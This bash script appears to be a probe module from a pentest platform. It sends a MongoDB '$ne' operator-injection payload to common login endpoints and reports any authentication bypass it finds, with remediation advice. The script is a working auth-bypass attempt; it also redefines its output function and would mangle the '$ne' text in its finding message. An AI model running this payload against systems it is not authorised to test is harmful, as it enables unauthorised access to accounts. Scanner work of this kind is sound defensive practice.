#!/usr/bin/env bash
# ============================================================================
# SentinelAI Autonomous Pentest Platform — Security PoC Probe
# Name:        NoSQL Injection Probe (MongoDB)
# Description: Tests for MongoDB operator injection in JSON endpoints
# Severity:    HIGH
# Category:    Injection Flaws (SQLi, XSS, Command, SSTI, XXE)
# Language:    bash
# ============================================================================

# Target argument handling: allow positional arg $1 or env var TARGET
TARGET="${1:-${TARGET:-}}"
SCAN_ID="${SCAN_ID:-standalone_poc_test}"
DEPTH="${DEPTH:-standard}"

if [ -z "$TARGET" ]; then
  echo -e "\033[1;31m[-] Error: Missing TARGET argument.\033[0m"
  echo -e "\033[1;33m[*] Usage:   $0 <target_url_or_ip>\033[0m"
  echo -e "\033[1;34m[*] Example: $0 https://example.com\033[0m"
  exit 1
fi

# Normalize URL: remove trailing slash
TARGET="${TARGET%/}"

echo -e "\033[1;36m[*] [SentinelAI PoC] Running probe: NoSQL Injection Probe (MongoDB)\033[0m"
echo -e "\033[1;34m[*] Target: $TARGET\033[0m"
echo ""

# Standard emit handler for standalone terminal execution
emit() {
  echo -e "\033[1;32m[+] VULNERABILITY CONFIRMED / FINDING EMITTED:\033[0m"
  echo "$1" | python3 -m json.tool 2>/dev/null || echo "    $1"
}

# --- Core PoC Execution ---
emit() { printf '%s\n' "$1"; }
T="$TARGET"
PAYLOAD='{"username":{"$ne":null},"password":{"$ne":null}}'
PATHS="api/login api/auth/login api/v1/login api/v1/auth/login api/signin login user/login api/users/login"
for P in $PATHS; do
  R=$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "Content-Type: application/json" -d "$PAYLOAD" --max-time 10 "$T/$P" 2>/dev/null)
  if [ "$R" = "200" ]; then
    RESP=$(curl -s -X POST -H "Content-Type: application/json" -d "$PAYLOAD" --max-time 10 "$T/$P" 2>/dev/null | head -c 1000)
    # successful auth bypass usually returns a token
    if echo "$RESP" | grep -q "token\|success\|session\|user"; then
      # verify with wrong-type payload for differential
      RESP2=$(curl -s -X POST -H "Content-Type: application/json" -d '{"username":"xxnonexistxx","password":"xxwrongxx"}' --max-time 10 "$T/$P" 2>/dev/null | head -c 500)
      if ! echo "$RESP2" | grep -q "token\|success"; then
        emit "{\"title\":\"NoSQL injection auth bypass: /$P\",\"severity\":\"critical\",\"description\":\"MongoDB $ne operator injection bypasses authentication at /$P. Login succeeds with {'$ne':null} without valid credentials.\",\"remediation\":\"Validate input types strictly. Use schema validation. Escape $ operators in user input.\",\"cweId\":\"CWE-943\",\"owaspCategory\":\"A03:2025-Injection\"}"
      fi
    fi
  fi
done

echo ""
echo -e "\033[1;34m[*] Probe execution complete.\033[0m"
